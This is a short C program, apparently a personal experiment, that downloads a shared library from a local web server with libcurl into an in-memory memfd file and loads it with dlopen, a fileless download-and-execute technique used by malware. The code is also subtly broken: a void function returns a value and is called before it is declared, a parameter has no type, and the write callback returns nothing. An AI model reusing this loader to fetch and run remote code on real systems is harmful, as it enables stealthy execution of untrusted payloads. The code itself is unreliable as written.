#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>
#include <errno.h>
// #include <sys/memfd.h>
#include <sys/types.h> 
#include <sys/syscall.h> 
#include <curl/curl.h>

// なんか sys/memfd.h が見つからなかったのでラーパー書いて対処
// https://github.com/a-darwish/memfd-examples/blob/master/memfd.h#L14
static inline int memfd_create(const char *name, unsigned int flags) {
  return syscall(__NR_memfd_create, name, flags);
}

void die(const char *msg)
{
  perror(msg);
  exit(errno);
}

void load_shared_object(memfd)
{
  char path[1024];
  printf("[+] Load Start\n");
  snprintf(path, 1024, "/proc/%d/fd/%d", getpid(), memfd);
  dlopen(path, RTLD_LAZY);
}

size_t write_to_memfd(char *ptr, size_t size, size_t nmemb, int memfd)
{
  if (write(memfd, ptr, nmemb) == -1) {
    close(memfd);
    die("[-] Faile write to memfd\n");
  } 
  printf("[+] Written memfd\n");
}

int get_shared_object(char *url)
{
  int memfd;
  CURL *curl;
  printf("[+] Get Shared Object from %s\n", url);

  memfd = open_memfd();
  curl = curl_easy_init();

  curl_easy_setopt(curl, CURLOPT_URL, url);
  curl_easy_setopt(curl, CURLOPT_WRITEDATA, memfd);
  curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_to_memfd);

  curl_easy_perform(curl);
  curl_easy_cleanup(curl);

  return memfd;
}

void open_memfd()
{
  int memfd;
  memfd = memfd_create("hello", 1);
  if (memfd == -1) {
    die("[-] Failed to memfd_create\n");
  }
  return memfd;
}


int main (int argc, char **argv)
{
  char *url = "http://127.0.0.1:8000/hello.so";
  int memfd;
  memfd = get_shared_object(url);
  load_shared_object(memfd);
  exit(0);
}
